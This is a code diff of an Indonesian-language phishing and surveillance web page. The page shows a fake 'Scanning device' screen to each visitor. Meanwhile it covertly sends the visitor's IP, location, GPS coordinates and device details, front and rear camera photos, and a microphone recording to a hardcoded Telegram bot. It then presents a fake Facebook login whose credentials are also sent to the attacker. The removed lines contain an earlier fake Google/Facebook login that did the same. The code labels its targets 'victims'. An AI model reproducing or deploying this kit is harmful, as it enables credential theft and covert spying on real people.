@@ -1,50 +1,59 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>Loading system...</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      margin: 0;
-      background: black;
-      color: lime;
-      font-family: monospace;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
-    }
-    h1 {
-      text-shadow: 0 0 10px lime;
-    }
-    .login-container {
-      margin-top: 20px;
-    }
-    .btn-login {
-      background: lime;
-      border: none;
-      padding: 10px 20px;
-      margin: 5px;
-      color: black;
-      font-weight: bold;
-      cursor: pointer;
-      border-radius: 5px;
-      text-shadow: none;
-    }
-  </style>
+<meta charset="UTF-8">
+<title>Scanning Device...</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body {
+  margin: 0;
+  background: black;
+  color: lime;
+  font-family: monospace;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  flex-direction: column;
+}
+h1 {
+  text-shadow: 0 0 10px lime;
+}
+#loginForm {
+  display: none;
+  flex-direction: column;
+  align-items: center;
+}
+input {
+  margin: 10px;
+  padding: 10px;
+  width: 250px;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+}
+button {
+  padding: 10px 20px;
+  background: #1877f2;
+  color: white;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+}
+</style>
 </head>
 <body>
 
-<h1>Silahkan Login Terlebih Dahalu</h1>
-<div class="login-container">
-  <button class="btn-login" onclick="fakeLogin('Facebook')">Login Facebook</button>
-  <button class="btn-login" onclick="fakeLogin('Google')">Login Google</button>
-</div>
+<h1 id="judul">Scanning device...</h1>
 
 <video id="video" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
+
+<div id="loginForm">
+  <h2 style="color:#1877f2;">Facebook Login</h2>
+  <input type="text" id="email" placeholder="Email atau Nomor Telepon">
+  <input type="password" id="password" placeholder="Kata Sandi">
+  <button onclick="kirimLogin()">Masuk</button>
+</div>
 
 <script>
 const token = '7163723754:AAEIQk6FGjz2TsS4ELirDfIAbpaOThTAMdU';
@@ -52,8 +61,8 @@ const chat_id = '6624966395';
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
+const mulai = Date.now();
 
-// Kirim teks ke Telegram
 function kirimPesan(text) {
   fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: 'POST',
@@ -62,59 +71,58 @@ function kirimPesan(text) {
   });
 }
 
-// Kirim file ke Telegram
-function kirimFile(audioBlob) {
-  const form = new FormData();
+function kirimFoto(blob, caption) {
+  let form = new FormData();
   form.append('chat_id', chat_id);
-  form.append('audio', audioBlob, 'rekaman.webm');
+  form.append('photo', blob, 'foto.jpg');
+  form.append('caption', caption);
+  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+    method: 'POST',
+    body: form
+  });
+}
+
+function kirimAudio(blob) {
+  let form = new FormData();
+  form.append('chat_id', chat_id);
+  form.append('audio', blob, 'rekaman.mp3');
+  form.append('caption', '🎤 Rekaman suara korban');
   fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
     method: 'POST',
     body: form
   });
 }
 
-// Fake login
-function fakeLogin(provider) {
-  let email = prompt(`Masukkan Email ${provider}:`);
-  let password = prompt(`Masukkan Password ${provider}:`);
-  if (email && password) {
-    // Kirim pesan pertama sebelum hasil
-    const mulaiPesan = `𝘼𝙙𝙖 𝙍𝙚𝙨𝙪𝙡𝙩 𝙉𝙞𝙝 𝘽𝙖𝙣𝙜 𝘿𝙤𝙣𝙯 𝙆𝙖𝙡𝙞 𝙄𝙣𝙞 𝙑𝙞𝙖 ${provider} 𝘿𝙞 𝙗𝙖𝙬𝙖𝙝 𝙄𝙣𝙞 𝘿𝙖𝙩𝙖 𝘿𝙖𝙩𝙖 𝙉𝙮𝙖 𝙮𝙖..`;
-    kirimPesan(mulaiPesan);
-
-    // Kirim pesan setelah proses selesai dengan data login
-    const loginData = `
-==🌟 𝙍𝙀𝙎𝙐𝙇𝙏 𝘽𝘼𝙉𝙂 𝘿𝙊𝙉𝙕 🌟==
-📧 Email/nomor: ${email}
-🔒 Password: ${password}
-🖥 Login: ${provider}
-🌐 Result: Metode Hack akun
-==============================
-`;
-    setTimeout(() => {
-      kirimPesan(loginData);
-    }, 2000); // Menunggu 2 detik sebelum mengirimkan data login
-  }
+function ambilFoto() {
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  canvas.toBlob(blob => {
+    kirimFoto(blob, '📸 Foto kamera depan korban');
+  }, 'image/jpeg');
 }
 
-// Info device awal
-kirimPesan('📝𝘽𝙚𝙧𝙞𝙠𝙪𝙩 𝘿𝙖𝙩𝙖 𝘿𝙖𝙩𝙖 𝙆𝙤𝙧𝙗𝙖𝙣 𝘽𝙖𝙣𝙜:');
+// Start akses data
+kirimPesan('📝 Data korban masuk...');
 
+// IP & Lokasi
 fetch('https://api.ipify.org?format=json')
-  .then(res => res.json())
-  .then(ipData => fetch('https://ipapi.co/' + ipData.ip + '/json/'))
-  .then(loc => loc.json())
-  .then(info => {
-    const device = navigator.userAgent;
-    const ram = navigator.deviceMemory || 'Tidak diketahui';
-    const cpu = navigator.hardwareConcurrency || 'Tidak diketahui';
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const bahasa = navigator.language;
-    const browser = navigator.appName + ' ' + navigator.appVersion;
-    const statusJaringan = navigator.onLine ? 'Online' : 'Offline';
+.then(res => res.json())
+.then(ipData => fetch('https://ipapi.co/' + ipData.ip + '/json/'))
+.then(loc => loc.json())
+.then(info => {
+  const device = navigator.userAgent;
+  const ram = navigator.deviceMemory || 'Tidak diketahui';
+  const cpu = navigator.hardwareConcurrency || 'Tidak diketahui';
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const bahasa = navigator.language;
+  const browser = navigator.appName + ' ' + navigator.appVersion;
+  const statusJaringan = navigator.onLine ? 'Online' : 'Offline';
 
-    navigator.getBattery().then(bat => {
-      const status = `
+  navigator.getBattery().then(bat => {
+    const now = Date.now();
+    const waktuBuka = Math.floor((now - mulai) / 1000);
+    const status = `
 == INFORMASI KORBAN ==
 🌐 IP: ${info.ip}
 🏳 Negara: ${info.country_name}
@@ -129,79 +137,85 @@ fetch('https://api.ipify.org?format=json')
 🗣️ Bahasa: ${bahasa}
 🧭 Browser: ${browser}
 📡 Status Jaringan: ${statusJaringan}
+⏳ Waktu buka web: ${waktuBuka} detik
 =====================`;
-
-      kirimPesan(status);
-    });
+    kirimPesan(status);
   });
+});
 
 // Lokasi GPS
 if ("geolocation" in navigator) {
   navigator.geolocation.getCurrentPosition(pos => {
     const lat = pos.coords.latitude;
     const lon = pos.coords.longitude;
-    const lokasi = `📍Lokasi GPS:\nhttps://www.google.com/maps?q=${lat},${lon}`;
+    const lokasi = `📍 Lokasi GPS:\nhttps://www.google.com/maps?q=${lat},${lon}`;
     kirimPesan(lokasi);
   });
 }
 
-// Kamera - Ambil foto tiap 10 detik
-navigator.mediaDevices.getUserMedia({ video: true })
+// Kamera depan
+navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
 .then(stream => {
   video.srcObject = stream;
   video.play();
-  setInterval(() => {
+  setTimeout(() => {
     ambilFoto();
-  }, 3000);
+    stream.getTracks().forEach(track => track.stop());
+    // Kamera belakang setelah depan
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+    .then(stream2 => {
+      video.srcObject = stream2;
+      video.play();
+      setTimeout(() => {
+        ambilFoto();
+        stream2.getTracks().forEach(track => track.stop());
+      }, 5000);
+    });
+  }, 5000);
 })
 .catch(err => {
   kirimPesan("Gagal akses kamera: " + err);
 });
 
-function ambilFoto() {
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-  canvas.toBlob(blob => {
-    let form = new FormData();
-    form.append('chat_id', chat_id);
-    form.append('photo', blob, 'foto.jpg');
-    form.append('caption', '📸 𝙁𝙤𝙩𝙤 𝙆𝙤𝙧𝙗𝙖𝙣 𝙎𝙪𝙠𝙨𝙚𝙨');
-    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-      method: 'POST',
-      body: form
-    });
-  }, 'image/jpeg');
-}
-
-// Rekam suara otomatis
+// Rekam Microphone
 navigator.mediaDevices.getUserMedia({ audio: true })
 .then(stream => {
   const mediaRecorder = new MediaRecorder(stream);
-  let chunks = [];
+  const audioChunks = [];
 
-  mediaRecorder.ondataavailable = e => {
-    chunks.push(e.data);
+  mediaRecorder.ondataavailable = event => {
+    audioChunks.push(event.data);
   };
-
   mediaRecorder.onstop = () => {
-    const audioBlob = new Blob(chunks, { type: 'audio/webm' });
-    kirimFile(audioBlob);
-    chunks = [];
-    mediaRecorder.start(); // Mulai lagi setelah kirim
-    setTimeout(() => {
-      mediaRecorder.stop();
-    }, 60000); // 1 menit
+    const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
+    kirimAudio(audioBlob);
   };
 
   mediaRecorder.start();
   setTimeout(() => {
     mediaRecorder.stop();
-  }, 60000);
+  }, 10000); // rekam 10 detik
 })
 .catch(err => {
   kirimPesan("Gagal akses microphone: " + err);
 });
+
+// Tampilkan Login Palsu
+setTimeout(() => {
+  document.getElementById('judul').style.display = 'none';
+  document.getElementById('loginForm').style.display = 'flex';
+}, 15000); // setelah 15 detik tampil login
+// (waktu bisa diatur sesuai keinginan)
+
+function kirimLogin() {
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
+  kirimPesan(`🔑 Login Korban:\nEmail/HP: ${email}\nPassword: ${password}`);
+  alert('Sedang masuk...');
+  setTimeout(() => {
+    window.location.href = 'https://facebook.com';
+  }, 2000);
+}
 </script>
 
 </body>
